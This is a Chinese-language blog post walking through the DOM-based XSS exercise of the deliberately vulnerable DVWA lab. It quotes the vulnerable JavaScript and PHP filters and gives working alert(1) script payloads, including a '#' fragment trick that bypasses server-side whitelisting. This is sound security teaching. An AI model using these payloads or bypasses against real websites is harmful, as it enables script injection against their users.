---
layout: post
title: "DVWA XSS (DOM) (教學用)"
description: ""
date: 2023-07-11
categories:
  - DVWA
  - DVWA_XSS
author: ""
tags: ['DVWA', 'XSS']
---



# DVWA XSS (DOM) (教學用)
###### tags: `DVWA`



## low


```
http://localhost/vulnerabilities/xss_d/?default=English
```


輸入default=11111111111111 可以被渲染
```
http://localhost/vulnerabilities/xss_d/?default=11111111111111
```


### dom 型

* 1資料有可能直接前端渲染
* 2也有可能經過後端過濾，最後在前端渲染


JS 代碼關鍵點。

```javascript
if (document.location.href.indexOf("default=") >= 0) {
    
    var lang = document.location.href.substring(document.location.href.indexOf("default=") + 8);
    
    document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");

}

```

### 找洞技巧:
快速定位取得get參數關鍵點(其實也可以不用右鍵檢查然後看一下邏輯也可。)
```
location.href.indexOf() 
```



這邊要研究一下
lang  跟 decodeURI(lang) 這兩個輸入點
```javascript=
document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
```

如果你輸入
```htmlembedded=
//default=<

// < 被browser encode 為 %3c
<option value="%3C"> < </option>

    
    
    
//default=%3c
// %3c 已經是url encode過，就不會再encode一次
<option value="%3C"> < </option>
```

最簡單的例子就是你隨便拿一個網頁
```
https://www.urlencoder.org



//加上?page=<<<<<<<<<<<<<<<<<<<<<<<<<<<< 
//按下enter
https://www.urlencoder.org/?page=<<<<<<<<<<<<<<<<<<<<<<<<<<<<





//雖然目前url =https://www.urlencoder.org/?page=<<<<<<<<<<<<<<<<<<<<<<<<<<<<

你拿這個網址copy 到新分頁 會變
https://www.urlencoder.org/?page=%3C%3C%3C%3C%3C%3C%3C%3C%3C%3C%3C%3C%3C%3C%3C%3C%3C%3C%3C%3C%3C%3C%3C%3C%3C%3C%3C%3C
```

lang 會被瀏覽器會自動url encode(不好利用)

但 decodeURI(lang) 幫我們 decode (好利用)




xss alert 一下
```
http://localhost/vulnerabilities/xss_d/?default=<script>alert(1);</script>
```




## medium



找到JS
```javascript=
<script >
    if (document.location.href.indexOf("default=") >= 0) {
        var lang = document.location.href.substring(document.location.href.indexOf("default=") + 8);
        document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
        document.write("<option value='' disabled='disabled'>-</option>");
    }

document.write("<option value='English'>English</option>");
document.write("<option value='French'>French</option>");
document.write("<option value='Spanish'>Spanish</option>");
document.write("<option value='German'>German</option>"); 
</script>
```

high 既然是跟前面一模一樣。 有古怪???

那就假設，資料走後端，然後過濾更嚴格!

但最後還是要經過JS前端渲染，所以利用點可以使用 html 錨點。



### html 錨點的
https://stackoverflow.com/questions/7909969/what-is-the-symbol-in-the-url

簡單來講，就是會跳到設定好的段落

概念: 網頁自動定為到段落1
```
http://123.com#段落1
```


### 現在我們知道 #號 後面可以加東西。

* 他還有一個最強的特性，#號後面的東西不會送到後端。

結合知識，我們的payload 大概可以長這樣 payload測試 可以成功。
```
http://localhost/vulnerabilities/xss_d/?default=#<script>alert(1);</script>
```

### 但是還沒結束，我們還沒黑合測試過濾機制。

不成功payload
```
http://localhost/vulnerabilities/xss_d/?default=111111111

http://localhost/vulnerabilities/xss_d/?default=<input/>
```

### 你也可以拿 payload 表去爆破

但經過測試只有這幾個可以成功，所以基本上是白名單了。

```
English
French
Spanish
German
```


### 看一下後端白名單:

```php

<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {

    # White list the allowable languages
    switch ($_GET['default']) {
        case "French":
        case "English":
        case "German":
        case "Spanish":
            # ok
            break;
        default:
            header ("location: ?default=English");
            exit;
    }
}

?>
```


## impossible 

### 作者給了一句話，就沒了(前端防禦沒屁用)
#### Don't need to do anything, protction handled on the client side





## 後記

衝著這段，我就想知道 < 轉碼的過程
```php=

<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
    $default = $_GET['default'];
    
    # Do not allow script tags
    if (stripos ($default, "<script") !== false) {
        header ("location: ?default=English");
        exit;
    }
}

?>
```




由於 輸入 < 老是被轉成 %3c 

起初以為是瀏覽器轉的，直到我用Burp suite 把 %3c 強迫改 <
發現沒有變化，所以 %3c 就是 <
遇到特殊字本身就是轉成編碼。




